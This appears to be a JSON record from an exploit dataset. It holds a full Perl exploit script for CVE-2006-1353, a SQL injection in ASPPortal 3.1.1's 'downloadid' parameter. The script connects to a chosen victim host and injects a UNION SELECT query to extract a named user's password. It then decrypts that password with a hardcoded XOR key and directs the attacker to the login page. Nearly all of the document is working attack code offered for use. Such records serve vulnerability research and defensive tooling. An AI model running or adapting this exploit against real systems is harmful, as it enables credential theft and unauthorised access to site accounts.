{
  "id": "1597",
  "title": "ASPPortal 3.1.1 - &#039;downloadid&#039; SQL Injection",
  "cve": "CVE-2006-1353",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=21\r\n#Usage: aspp.pl <host> <path> <user>\r\nuse IO::Socket;\r\nuse Math::BigInt;\r\nif(@ARGV != 3) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-21\\r\\n\";\r\n  print \"- ASPPortal <= 3.1.1 Remote SQL Injection Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path> <user>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to ASPPortal  ex: /portal/\\r\\n\";\r\n  print \"- <user> -> Username that you want password. ex: admin\\r\\n\";\r\n  exit();\r\n}\r\nsub decrypt ()\r\n{\r\n  $lp = length($appass);\r\n  $apkey = \"IY/;\\$>=3)?^-+7M32#Q]VOII.Q=OFMC`:P7_B;<R/8U)XFHC<SR_E\\$.DLG'=I+@5%*+OP:F_=';'NSY`-^S.`AA=BJ3M0.WF#T5LGK(=/<:+C2K/^7AI\\$;PU'OME2+T8ND?W\\$C(J\\,;631'M-LD5F%%1TF_&K2A-D-54[2P,#'*JU%6`0RF3CMF0(#T07U'FZ=>#,+.AW_/+']DIB;2DTIA57TT&-)O'/*F'M>H.XH5W^0Y*=71+5*^`^PKJ(=E/X#7A:?,S>R&T;+B#<:-*\\@)X9F`_`%QA3Z95.?_T#1,\\$2#FWW5PBH^*<])A(S0@AVD8C^Q0R^T1D?(1+,YE71X+.*+U\\$:3XO^Q].KG&0N0];[LJ<OZ6IN?7N4<GTL?(M'4S8+3JMK5]HC%^1^+K;\\\\$WBXPA?F&5^E\\D\\$7%*O/U[1/?8(5:1OVWV*1Z-%`:K&V?X1,1KURD@3W0^D)<OG40?(VJ4EWL5A5M<\\$A);CQ36R9I]*U#Q%1<Y\\&SA%#1<V\";\r\n  if ($lp == 0) { die(\"- An error occurued\\r\\n\"); }\r\n  for ($i = 0; $i < $lp ; $i++) {\r\n    $f = $lp - $i - 1; # Formula for getting character via substr...\r\n    $n = substr($apkey,$f,1);\r\n    $l = substr($appass,$f,1);\r\n    $appwd = chr(ord($n)^ord($l)).$appwd;\r\n  }\r\n  print \"- Password decrypted as: $appwd\\r\\n\";\r\n  print \"- Lets go $aphost$apdir$apfinal for login\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $apserver = $ARGV[0];\r\n  $apserver =~ s/(http:\\/\\/)//eg;\r\n  $aphost   = \"http://\".$apserver;\r\n  $apdir    = $ARGV[1];\r\n  $apport   = \"80\";\r\n  $aptar    = \"content/downloads/download_click.asp?downloadid=\";\r\n  $apfinal  = \"content/users/login.asp\";\r\n  $apxp     = \"-1+UNION+SELECT+0,0,0,0,0,0,0,0,0,0,password+FROM+users+where+username='$ARGV[2]'\";\r\n  $apreq    = $aphost.$apdir.$aptar.$apxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $apserver\\r\\n\";\r\n  $ap = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$apserver\", PeerPort => \"$apport\") || die \"- Connection failed...\\n\";\r\n  print $ap \"GET $apreq HTTP/1.1\\n\";\r\n  print $ap \"Accept: */*\\n\";\r\n  print $ap \"Referer: $aphost\\n\";\r\n  print $ap \"Accept-Language: tr\\n\";\r\n  print $ap \"User-Agent: NukeZilla\\n\";\r\n  print $ap \"Cache-Control: no-cache\\n\";\r\n  print $ap \"Host: $apserver\\n\";\r\n  print $ap \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$ap>) {\r\n    if ($answer =~ /string: \"(.*?)\"]'/) {\r\n      print \"- Exploit succeed! Getting $ARGV[2]'s information\\r\\n\";\r\n      print \"- Username: $ARGV[2]\\r\\n\";\r\n      print \"- Decrypting password....\\r\\n\";\r\n      $appass = $1;\r\n      $appass =~ s/(\")/chr(34)/eg;\r\n      $appass =~ s/(<)/chr(60)/eg;\r\n      $appass =~ s/(>)/chr(62)/eg;\r\n      $appass =~ s/(&nbsp;)/chr(32)/eg;\r\n      decrypt();\r\n    }\r\n    if ($answer =~ /number of columns/) { \r\n      print \"- This version of ASPPortal is vulnerable too\\r\\n\";\r\n      print \"- but default query of SQL-Inj. does not work on it\\r\\n\";\r\n      print \"- So please edit query by manually adding null data..\\r\\n\";\r\n      exit(); \r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# milw0rm.com [2006-03-20]",
  "url": "https://www.exploit-db.com/exploits/1597"
}